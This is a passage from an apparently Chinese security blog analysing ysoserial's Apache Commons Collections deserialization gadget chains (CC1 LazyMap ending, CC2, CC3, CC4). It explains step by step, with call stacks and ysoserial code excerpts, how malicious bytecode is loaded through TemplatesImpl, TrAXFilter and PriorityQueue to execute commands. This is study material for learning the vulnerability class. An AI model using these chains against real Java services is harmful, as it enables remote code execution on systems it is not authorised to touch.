<h2 id="Gadgets-createMemoitizedProxy-lazyMap-Map-class"><a href="#Gadgets-createMemoitizedProxy-lazyMap-Map-class" class="headerlink" title="Gadgets.createMemoitizedProxy(lazyMap, Map.class)"></a>Gadgets.createMemoitizedProxy(lazyMap, Map.class)</h2><p>可以看到接下来Ysoserial调用了Gadgets类的一个方法来初始化代理，Gadgets类是Ysoserial中的核心类，我们跟进代码看这个方法究竟干了啥</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314230222-mc4g3gu.png" alt="image.png"></p>
<p>要求传入一个Map类型的对象和任意多个接口类型</p>
<p>这里我们传入了lazyMap实例对象和Map接口类型</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314232105-0trkgio.png" alt="image.png"></p>
<h3 id="ysoserial-payloads-util-Gadgets-createMemoizedInvocationHandler"><a href="#ysoserial-payloads-util-Gadgets-createMemoizedInvocationHandler" class="headerlink" title="ysoserial.payloads.util.Gadgets.createMemoizedInvocationHandler"></a>ysoserial.payloads.util.Gadgets.createMemoizedInvocationHandler</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314232329-0hggdy6.png" alt="image.png"></p>
<p>通过反射拿到了<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类的第一个构造器</p>
<blockquote>
<p>参数 ANN_INV_HANDLER_CLASS 值为 sun.reflect.annotation.AnnotationInvocationHandler. 该类是 Java 中专门用来处理注解的调用处理器 , 但 Java 中不允许直接获取该类 , 所以必须要通过反射( Reflection ) 才能拿到该类.</p>
</blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314232953-uoj1926.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220314232913-i5rb6ox.png" alt="image.png"></p>
<p>然后通过反射实例化这个控制器并返回到上面的方法中</p>
<blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315000429-pu02eik.png" alt="image.png"></p>
</blockquote>
<p>这里传入的var1是<code>Override.class</code>，是java 中自带的 Annotation 的实现类之一，此处只要传一个Annotation的实现类就行，对<code>Override.class</code>没有特别要求<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315000701-u9w0191.png" alt="image.png"></p>
<blockquote>
<p>（关于注解的知识会单独写一章学习，这里看别人文章真不如自己看源码。。</p>
</blockquote>
<p>继续继续–</p>
<h3 id="ysoserial-payloads-util-Gadgets-createProxy"><a href="#ysoserial-payloads-util-Gadgets-createProxy" class="headerlink" title="ysoserial.payloads.util.Gadgets.createProxy"></a>ysoserial.payloads.util.Gadgets.createProxy</h3><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315000947-tu71bao.png" alt="image.png"></p>
<p>通过反射新建了一个Class类型的数组<code>allIfaces</code>存放接口，长度是传入的接口类型数</p>
<p>然后将传入的接口类型都装到数组里</p>
<p>最后返回了一个jdk动态代理</p>
<blockquote>
<p><strong>java.lang.reflect.Proxy</strong>的newProxyInstance方法来构造一个<strong>指定接口</strong>的代理类的一个新实例，所有方法会调用给定处理器（也就是AnnotationInvocationHandler）的invoke方法</p>
</blockquote>
<p>回到，这里mapProxy很明确了，creatMemoitizedProxy方法也明确了</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315001625-t0xjg98.png" alt="image.png"></p>
<p>他返回了一个动态代理实例，其指定的接口是<code>Map</code>，其处理器是<code>AnnotationInvocationHandler</code></p>
<h2 id="Gadgets-createMemoizedInvocationHandler-mapProxy"><a href="#Gadgets-createMemoizedInvocationHandler-mapProxy" class="headerlink" title="Gadgets.createMemoizedInvocationHandler(mapProxy)"></a>Gadgets.createMemoizedInvocationHandler(mapProxy)</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315002139-i5yysn4.png" alt="image.png"></p>
<p>这个方法就是上面刚刚分析过的方法，传入我们刚刚创建的动态代理</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315002303-1d5v3er.png" alt="image.png"></p>
<p>把刚刚创建的动态代理赋值到memberValues里</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315003113-6hn0q2t.png" alt="image.png"></p>
<p>参考Epicccal师傅的说法：</p>
<blockquote>
<p><strong>这一步操作是为了目标服务器在反序列化时会调用 <code>AnnotationInvocationHandler.readObject()</code> 方法 , 从而调用动态代理对象的方法( 被代理的方法 ) , 从而触发拦截与转发 , 从而执行 <code>AnnotationInvocationHandler.invoke()</code> 方法.</strong></p>
</blockquote>
<p>稍后看readObject方法</p>
<p>最后</p>
<p>通过反射赋值，把真正的恶意代码数组加入到<code>transformerChain</code>中</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315002629-odkalvr.png" alt="image.png"></p>
<p>这条LazyMap调用链和我上一篇文章看的不大一样，但是最后原理都是相同的，那就是调用LazyMap的get方法从而触发transform</p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>调试是要结合前面的分析看的</p>
<p>我们传入的对象是<code>AnnotationInvocationHandler</code>对象，他会触发<code>AnnotationInvocationHandler.readObject()</code>方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315012506-86htoxo.png" alt="image.png"></p>
<p>而通过ysoserial中的生成的动态代理</p>
<p>AnnotationInvocationHandler.invoke()会被调用<br /></p>
<p>最终完成调用LazyMap.get()，从而完成LazyMap攻击链</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220315015649-2ozypie.png" alt="image.png"></p>
<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><ul>
<li><p>进一步学习注解和反射</p>
</li>
<li><p>再理解一次JAVA动态代理机制和设计模式</p>
</li>
<li><p>反序列化的原理。。</p>
</li>
<li><p>再看文章，再看文章</p>
</li>
<li><p>明天写一下此文补充点和知识</p>
</li>
</ul>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections2反序列化链分析</title>
    <url>/2022/03/17/cc2study/</url>
    <content><![CDATA[<p>经过CC1和URLDNS两条链子的洗礼，从CC2开始打算自主调试分析</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>依赖：commons-collections4-4.0.jar</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">	Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.<span class="built_in">exec</span>()</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>


<h2 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl( )"></a>Gadgets.createTemplatesImpl( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114550-va46ovc.png" alt="image.png"></p>
<p>跟进</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114752-jzogs5x.png" alt="image.png"></p>
<p>这里稍有复杂，先一步一步分析</p>
<p>首先实例化了<code>class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317114908-ygjrpcf.png" alt="image.png"></p>
<p>初始化ClassPool对象，插入ClassPath</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317131106-nfrtssh.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132149-w56pc8g.png" alt="image.png"></p>
<p>通过ClassPool实例的.get()方法，获取CtClass对象</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132256-kc80qb9.png" alt="image.png"></p>
<blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317142449-vfzv2oi.png" alt="image.png"></p>
<p>这个类作为基类，下面的操作都是基于此进行修改</p>
</blockquote>
<p>为CtClass添加一个静态块，当这个类被实例化的时候，静态块内代码会执行，也就是我们传入的恶意命令</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317132423-4j4y9dz.png" alt="image.png"></p>
<p>为这个类重新命名</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141133-nh7mnqv.png" alt="image.png"></p>
<p>获取到AbstTranslet类并将其设置为刚刚类的父类</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141212-tjrypda.png" alt="image.png"></p>
<p>添加一行输出，查看刚刚系一列操作最后得到的Class</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317141856-c7cd25q.png" alt="image.png"></p>
<p>这个时候就能很容易的把上面的各种Javassist的操作对应起来。Ysoserial用JAVAssist操作来动态修改了这个Class并且加入了一个会被自动加载的，存有恶意代码的静态块。</p>
<p>把字节码加载到实例对象里面，用<code>Reflections.setFieldValue</code>设置成<code>templates</code>域值</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317142921-ornj7ux.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317143105-jpws1a4.png" alt="image.png"></p>
<p>返回templates对象，方法结束</p>
<h2 id="new-InvokerTransformer-）"><a href="#new-InvokerTransformer-）" class="headerlink" title="new InvokerTransformer( ）"></a>new InvokerTransformer( ）</h2><p>实例化InvokerTransformer</p>
<p>根据注释，这里只是模仿了method name，就是说还没有armed攻击载荷。</p>
<p>toString方法也不是想要反射调用的方法，只是占位。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317144841-4loees4.png" alt="image.png"></p>
<p>关于<code>InvokerTransformer</code>在CC1里面分析过了，这里不再赘述，其<code>transform</code>方法可以反射调用，为CC的最根本的漏洞成因。</p>
<h2 id="new-PriorityQueue"><a href="#new-PriorityQueue" class="headerlink" title="new PriorityQueue( )"></a>new PriorityQueue( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317145438-b590ujj.png" alt="image.png"></p>
<p>新建一个优先级队列<a href="https://www.cainiaojc.com/java/java-priorityqueue.html">https://www.cainiaojc.com/java/java-priorityqueue.html</a></p>
<p>初始化的时候将新建的<code>TransformingComparator</code>作为比较器传入</p>
<blockquote>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317145917-8yk8pyj.png" alt="image.png"></p>
</blockquote>
<p>当我们跟进<code>TransformingComparator</code>的时候，很清晰的能看到它的compare方法，调用了比较的两个对象的transform方法，这不就来了吗，初始化<code>TransformingComparator</code>的时候，传入的transformer是<code>InvokerTransformer</code>实例，这里调用的就是<code>InvokerTransformer.transform</code>方法，实现反射调用<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317150034-fxou8lo.png" alt="image.png"></p>
<p>但是现在这个方法有点没头没尾的，哪里调用了compare，传入的两个参数又是啥，先看ysoserial怎么处理</p>
<h2 id="Reflections-setFieldValue"><a href="#Reflections-setFieldValue" class="headerlink" title="Reflections.setFieldValue( )"></a>Reflections.setFieldValue( )</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317150829-tcz6qkn.png" alt="image.png"></p>
<p>之前占位的<code>toString</code>被更改为<code>newTransFormer</code></p>
<p>获取到了刚实例化的优先级字段的域值，进行修改</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317151310-37rpoxj.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317151343-1k6rkv1.png" alt="image.png"></p>
<p>数组第一个元素变为刚刚包含了恶意字节码的templates对象，他就是上面用来<code>compare</code>的object对象</p>
<blockquote>
<p>这两个赋值操作让我一下豁然开朗啊！ysoserial就是这个模式，前面用占位符避免在payload生成的时候触发，最后用反射方法来赋值。所以到最后才能get到他的payload逻辑！</p>
</blockquote>
<p>也就是说这条链子的逻辑大概是这个样子：</p>
<ol>
<li><p>优先级列表进行排序，自定义了<code>comparator</code>为<code>TransformingComparator</code></p>
</li>
<li><p>对<code>templates</code>进行排序的时候，它实际上在这里</p>
<p> <img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317152746-gqnj1oq.png" alt="image.png"></p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用的是</span><br><span class="line">InvokerTransformer.transform(templates)</span><br></pre></td></tr></table></figure></li>
<li><p>templates的<code>iMethodName</code>为<code>newTransFormer</code>，因为templates 实例对象是 TemplatesImpl 类型的 , 实际上反射调用的是<code>TemplatesImpl.newTransformer()</code>方法</p>
</li>
<li><p>这个时候如果我们的恶意Class文件被怎么着实例化了，就能够触发恶意代码</p>
</li>
</ol>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317153538-zf16p1d.png" alt="image.png"></p>
<p>最后将这个队列对象返回，进行序列化</p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>通过调试，我想知道以下几个问题</p>
<ol>
<li>完整调用过程</li>
<li>上面的Class怎么被加载，导致恶意代码执行，因为<code>TemplatesImpl.newTransformer()</code>并不是终点。</li>
<li>触发队列排序的地方</li>
</ol>
<p>在PriorityQueue的<code>readObject</code>方法处打上断点截断</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317154349-dnxeu9d.png" alt="image.png"></p>
<p>通过遍历将序列化的数据读了出来，可以看到templates被读取了出来</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317155846-qr4wpy3.png" alt="image.png"></p>
<p>步入heapify()方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160037-2fmtlrn.png" alt="image.png"></p>
<p>直接步入siftDown方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160126-gs6bfq0.png" alt="image.png"></p>
<p>步入siftDownUsingComparator方法，这里我们要用上自己定义的Comparator了！</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160424-k6j16q9.png" alt="image.png"></p>
<p>步入compare方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160559-wx6wovo.png" alt="image.png"></p>
<p>调用的就是<code>InvokerTransformer.transform()</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317160922-ng7c9gj.png" alt="image.png"></p>
<p>（多走了一步，红框处就是反射调用了newTransformer</p>
<p>即<code>TemplatesImpl.newTransformer</code>，弹出计算器</p>
<p>所以我们必须要深究一下<code>TemplatesImpl.newTransformer</code></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317161011-l4ak8ht.png" alt="image.png"><br /></p>
<h2 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer"></a>TemplatesImpl.newTransformer</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer</p>
<p>反射调用的方法，必须要在这里打断点才能截获</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317171807-pllwi2a.png" alt="image.png"></p>
<p>步入<code>getTransletInstance()</code></p>
<p>这里需要<code>_name</code>不为空才能往下面走<img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317183234-7z9vpqi.png" alt="image.png"></p>
<p>继续步入<code>defineTransletClasses()</code></p>
<p>使用ClassLoader加载恶意字节码</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317202505-rjvq4th.png" alt="image.png"></p>
<p>且这里他的父类要是”com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet”，才能在下面实例化</p>
<p>加载完字节码之后，实例化，触发恶意方法，cc2结束</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317202753-2qx49lg.png" alt="image.png"></p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220317162134-vjaktpv.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections3反序列化链分析</title>
    <url>/2022/03/20/cc3study/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>调试分析 ysoserial 种的 Apache Commons Collections 系列第三条链子。</p>
<p>这篇开始算是脱离了萌新期，有重点地针对核心部分进行分析，篇幅也开始</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>jdk1.7+tomcat8+Apache Commons Collections3.1</p>
<p>（cc2 的环境是 4.4 所以要换一下)</p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320132820-4tpc4xo.png" alt="image-20220320132820-4tpc4xo.png"><br /></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>ysoserial 中的注释说明;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* Variation on CommonsCollections1 that uses InstantiateTransformer instead of</span><br><span class="line">* InvokerTransformer.</span><br></pre></td></tr></table></figure>

<p>这回我们不用 <code>InvokerTransformer</code> 了，改用 <code>InstantiateTransformer</code> 替代，回顾一下前者在 cc1 里的作用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer.transform()</span><br><span class="line">	Method.invoke()</span><br><span class="line">		Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>是最后执行反射调用的类。</p>
<h2 id="Gadgets-createTemplatesImpl-command"><a href="#Gadgets-createTemplatesImpl-command" class="headerlink" title="Gadgets.createTemplatesImpl(command)"></a>Gadgets.createTemplatesImpl(command)</h2><p>这个方法在 cc2 里面分析过了</p>
<p>它返回一个 templates 对象，其中包含了动态构造的恶意字节码，当恶意类被加载实例化的时候会触发恶意代码。</p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320133246-v9pwg8q.png" alt="image-20220320133246-v9pwg8q.png"></p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320133610-8jf5xlw.png" alt="image-20220320133610-8jf5xlw.png"></p>
<h2 id="new-ChainedTransformer"><a href="#new-ChainedTransformer" class="headerlink" title="new ChainedTransformer"></a>new ChainedTransformer</h2><p>初始化一个 <code>ChainedTransformer</code> 对象，并新建一个 <code>Transformer</code> 数组，其中为初始值，这是 <em>ysoserial</em> 的常规操作。</p>
<p>由于这里还是 <code>ChainedTransformer</code> 对象，所以和 cc1 一样，利用方法是将数组中第一个元素的 <code>transform</code> 方法返回值作为下一个数组元素 <code>transform</code> 方法的输入值</p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320134613-qrjnqsr.png" alt="image-20220320134613-qrjnqsr.png"></p>
<p>随后构造真正的 chain</p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320134852-7m5urdz.png" alt="image-20220320134852-7m5urdz.png"></p>
<p>开始分析这个 <code>transformer</code> 数组</p>
<h3 id="new-ConstantTransformer"><a href="#new-ConstantTransformer" class="headerlink" title="new ConstantTransformer"></a>new ConstantTransformer</h3><p>返回 <code>TrAXFilter.class</code></p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320135407-bq8jy27.png" alt="image-20220320135407-bq8jy27.png"><br /></p>
<h3 id="new-InstantiateTransformer"><a href="#new-InstantiateTransformer" class="headerlink" title="new InstantiateTransformer"></a>new InstantiateTransformer</h3><p><img src="https://o.130014.xyz/2022/03/20/image-20220320135811-mlmbv31.png" alt="image-20220320135811-mlmbv31.png"></p>
<p>跟进构造器和这个类的 transform 方法</p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320135934-zyngloh.png" alt="image-20220320135934-zyngloh.png"></p>
<p>构造方法传入了 <code>Templates.class</code> 和刚刚包含了恶意字节码的 <code>templatesImpl</code> 实例对象</p>
<p>然后这里 input 参数是上个数组元素传回来的 <code>TrAXFilter.class</code>，所以反射拿到的是 <code>TrAXFilter</code> 类的构造器，接着通过构造器传入我们构造的 <code>templatesImpl</code> 恶意对象反射实例化类并返回。</p>
<blockquote>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320140547-5bmu12l.png" alt="image-20220320140547-5bmu12l.png"></p>
<p>可以清楚的看到 <code>TrXFilter</code> 类中对传入的 <code>templates</code> 调用了 <code>newTransformer</code> 方法。</p>
<p>在 CC2 中分析过了，这里会实例化我们的恶意 class 并加载它静态块里的内容。</p>
<p>所以这里其实是整条链子的最后一环，TrAXFilter+InstantiateTransformer，十分巧妙的配合。</p>
</blockquote>
<p>至此我们获得了构造好的 transformer 数组，并且当 <code>ChainedTransformer.transform</code> 被调用的时候就会自动加载整条链子完成调用。</p>
<h2 id="构造-LazyMap-攻击链"><a href="#构造-LazyMap-攻击链" class="headerlink" title="构造 LazyMap 攻击链"></a>构造 LazyMap 攻击链</h2><p>同 CC1 一样的 LazyMap 攻击链，此处不再多分析。</p>
<p>最后设置的入口是 <code>AnnotationInvocationHandler.readObject()</code>，在 cc1 中我们分析过这个方法此处不再赘述。</p>
<blockquote>
<p>sun.reflect.annotation.AnnotationInvocationHandler</p>
</blockquote>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320141808-q7xsv5j.png" alt="image-20220320141808-q7xsv5j.png"></p>
<h2 id="反射赋值"><a href="#反射赋值" class="headerlink" title="反射赋值"></a>反射赋值</h2><p>最后把刚开始初始化的值用我们构造好的 <code>transformer</code> 数组替换掉，ysoserial 这样做为了防止在 payload 初始化的时候就出发了攻击链，并且也起到安全保护等效果，个人看来最后把真正的 payload 加载进去像装子弹一样，很清晰。</p>
<p><img src="https://o.130014.xyz/2022/03/20/image-20220320142012-sfhhy48.png" alt="image-20220320142012-sfhhy48.png"></p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>和 cc1,cc2 一样，基本没变，和 cc1 相比这么多是一样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br></pre></td></tr></table></figure>

<p><a href="https://www.wailian.work/image/QUPOHV"><img src="https://o.130014.xyz/2022/03/20/image-20220320145254-1a0lbfh.png" alt="image-20220320145254-1a0lbfh.png"></a></p>
<p>很清晰的方法栈。</p>
<p>template 对象和 TrAXFilter 构造器</p>
<p><a href="https://www.wailian.work/image/QUPWJ4"><img src="https://o.130014.xyz/2022/03/20/image-20220320145346-rg5aw3v.png" alt="image-20220320145346-rg5aw3v.png"></a></p>
]]></content>
      <categories>
        <category>javaSec</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections4反序列化链分析</title>
    <url>/2022/04/03/cc4study/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文分析调试ysoserial中的CC4。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Variation on CommonsCollections2 that uses InstantiateTransformer instead of</span><br><span class="line"> * InvokerTransformer.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>

<p>和CC2不同的是，CC4使用了<code>InstantiateTransformer</code>代替<code>InvokerTransformer</code></p>
<p>也就是说和CC3一样，都是用这个类来反射调用方法。所以CC4实际上是CC2+CC3</p>
<p>本篇也会对之前的内容多一点回顾与复习。</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdk1<span class="number">.7</span>+tomcat8+commons:commons-collections4:<span class="number">4.0</span></span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402232047-t45nbv4.png" alt="image.png"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="Gadgets-createTemplatesImpl-command"><a href="#Gadgets-createTemplatesImpl-command" class="headerlink" title="Gadgets.createTemplatesImpl(command)"></a>Gadgets.createTemplatesImpl(command)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>

<p>构造并返回了一个包含了恶意字节码的TemplatesImpl对象，组建Templates攻击链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constant</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(String.class);</span><br></pre></td></tr></table></figure>

<p>新建一个<code>ConstantTransformer</code>对象然后填充一个<code>String.class</code>占位。</p>
<h2 id="new-InstantiateTransformer"><a href="#new-InstantiateTransformer" class="headerlink" title="new InstantiateTransformer"></a>new InstantiateTransformer</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line">Class[] paramTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;foo&quot;</span> &#125;;</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">		paramTypes, args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// grab defensively copied arrays</span></span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iParamTypes&quot;</span>);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, <span class="string">&quot;iArgs&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402233557-oyg4jqy.png" alt="image.png"></p>
<p><code>InstantiateTransformer</code>类定义了一个<code>transform</code>方法，这是触发点。</p>
<p>通过getConstructor来拿到input类的参数类型为<code>this.iParamTypes</code>的构造方法，这里传入的为<code>paramTypes</code>为<code>String.class</code>。</p>
<p>然后通过newInstance来实例化对象，这里传入的args为一个foo字符占位。</p>
<p>用<code>Reflections.getFieldValue</code>拿到两个Field，为之后填充真实的payload做准备。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123; constant, instantiate &#125;);</span><br></pre></td></tr></table></figure>

<p>将<code>InstantiateTransformer</code>和<code>ConstantTransformer</code>包含到<code>ChainedTransformer</code>里。</p>
<p>这样当触发<code>ChainedTransformer.transform()</code>的时候，就能够递归调用数组中的transform方法，也能触发最后<code>InstantiateTransformer.transform()</code>，至于传入的对象现在还没填充。</p>
<h2 id="new-PriorityQueue"><a href="#new-PriorityQueue" class="headerlink" title="new PriorityQueue"></a>new PriorityQueue</h2><p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235204-mpqusn8.png" alt="image.png"></p>
<p>优先队列，这个可以去看cc2讲的很详细。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235408-3oyqcr9.png" alt="image.png"></p>
<h2 id="反射赋值"><a href="#反射赋值" class="headerlink" title="反射赋值"></a>反射赋值</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// swap in values to arm</span></span><br><span class="line">Reflections.setFieldValue(constant, <span class="string">&quot;iConstant&quot;</span>, TrAXFilter.class);</span><br><span class="line">paramTypes[<span class="number">0</span>] = Templates.class;</span><br><span class="line">args[<span class="number">0</span>] = templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure>

<p>最后是ysoserial填充的时候，一般这个时候我们才能完全对链子了解。</p>
<p><code>TrAXFilter.class</code>被设置为<code>ConstantTransformer</code>的<code>iConstant</code>属性的值。</p>
<p>也就是<code>InstantiateTransformer.transform()</code>传入的input参数</p>
<p>加上下面的paramTypes和args的填充，基本上那个transform方法我们就能知道最后是咋搞得，主要是下面两句。</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220402235909-2djllj9.png" alt="image.png"></p>
<p>跟进到<code>TrAXFilter</code>的构造方法</p>
<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220403000315-42jmclb.png" alt="image.png"></p>
<p>这里传入的Templates对象就是我们构造的包含了恶意字节码的对象。</p>
<p><code>templates.newTransformer()</code>的时候，自动加载了静态块里的恶意代码，完成调用。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总之这条链子就是之前CC2和CC3的结合版，改动的地方不多，可以手写一下Gaget Chain看一下自己懂不懂逻辑hhh</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">		TransformingComparator.compare()</span><br><span class="line">			ConstantTransformer.transform()</span><br><span class="line">				InstantiateTransformer.transform()</span><br><span class="line">					TemplatesImpl.newTransformer()</span><br><span class="line">					加载静态块恶意代码</span><br></pre></td></tr></table></figure>


<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>断点打在：</p>
